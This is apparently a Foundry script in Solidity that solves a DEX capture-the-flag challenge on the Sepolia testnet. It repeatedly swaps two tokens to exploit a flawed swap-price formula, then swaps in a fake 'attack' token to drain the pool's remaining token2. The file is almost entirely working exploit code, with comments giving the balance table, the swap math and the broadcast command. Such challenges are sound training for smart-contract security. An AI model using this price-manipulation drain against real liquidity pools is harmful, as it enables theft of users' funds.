// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/Console.sol";

// token1: 0xceeeccd3379a4D78D7aD01f901995E443f5AC483
// token2: 0x7EBDdA08F082DED396b12Fcc42bA2067CE354908
// dex contract: 0xb73303b339346b7B220e239856757eDF5e8Dd918
interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);

    function swap(address from, address to, uint256 amount) external;

    function approve(address spender, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract TriggerAttack is Script {
    IDex public dex;
    IERC20 public attack;
    IERC20 public token1;
    IERC20 public token2;

    address attackAddr = 0xE59D048182c981417dbDB0C279Dce52429eC6670;
    address dexAddr = 0xb73303b339346b7B220e239856757eDF5e8Dd918;
    address token1Addr = 0xceeeccd3379a4D78D7aD01f901995E443f5AC483;
    address token2Addr = 0x7EBDdA08F082DED396b12Fcc42bA2067CE354908;
    address player = 0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02;

    uint256 token1PoolBalance;
    uint256 token2PoolBalance;
    uint256 playerToken1Balance;
    uint256 playerToken2Balance;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address account = vm.addr(privateKey);

        // Connect to Dex contract
        vm.startBroadcast(privateKey);
        dex = IDex(dexAddr);
        vm.stopBroadcast();

        // Connect to Token1 contract
        vm.startBroadcast(privateKey);
        token1 = IERC20(token1Addr);
        vm.stopBroadcast();

        // Connect to Token2 contract
        vm.startBroadcast(privateKey);
        token2 = IERC20(token2Addr);
        vm.stopBroadcast();

        // Connect to Attack (malicious) token contract
        vm.startBroadcast(privateKey);
        attack = IERC20(attackAddr);
        vm.stopBroadcast();

        // first approve dex to be able to spend our token
        // The bug is in the contract logic
        // Swap between tokens to take advantage of the getSwapPrice logic

        vm.startBroadcast(privateKey);
        // dex.approve(dexAddr, type(uint256).max);
        // attack.approve(dexAddr, type(uint256).max);

        dex.swap(token1Addr, token2Addr, token1.balanceOf(player));
        dex.swap(token2Addr, token1Addr, token2.balanceOf(player));
        dex.swap(token1Addr, token2Addr, token1.balanceOf(player));
        dex.swap(token2Addr, token1Addr, token2.balanceOf(player));
        dex.swap(token1Addr, token2Addr, token1.balanceOf(player));
        dex.swap(token2Addr, token1Addr, 45);

        // change the from token to our attack token
        // the value 300 might not work for you, cause I ran the script multiple times
        // And 300 was the only way to solve the challenge from the state I was after my initial runs
        dex.swap(attackAddr, token2Addr, 300);

        token1PoolBalance = dex.balanceOf(token1Addr, dexAddr);
        token2PoolBalance = dex.balanceOf(token2Addr, dexAddr);
        playerToken1Balance = token1.balanceOf(player);
        playerToken2Balance = token2.balanceOf(player);

        vm.stopBroadcast();

        console.log("token1 pool balance: ", token1PoolBalance);
        console.log("token2 pool balance: ", token2PoolBalance);
        console.log("token1 player balance: ", playerToken1Balance);
        console.log("token2 player balance: ", playerToken2Balance);
        console.log("Message sender", msg.sender);
        console.log("Player", player);
        console.log("Account", account);
    }
}

//     token 1 | token 2
// 10 in  | 100 | 100 | 10 out
// 24 out | 110 |  90 | 20 in
// 24 in  |  86 | 110 | 30 out
// 41 out | 110 |  80 | 30 in
// 41 in  |  69 | 110 | 65 out
//        | 110 |  45 | 45 in

// math for last swap
// 110 = token2 amount in * token1 balance / token2 balance
// 110 = token2 amount in * 110 / 45
// 45  = token2 amount in

// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
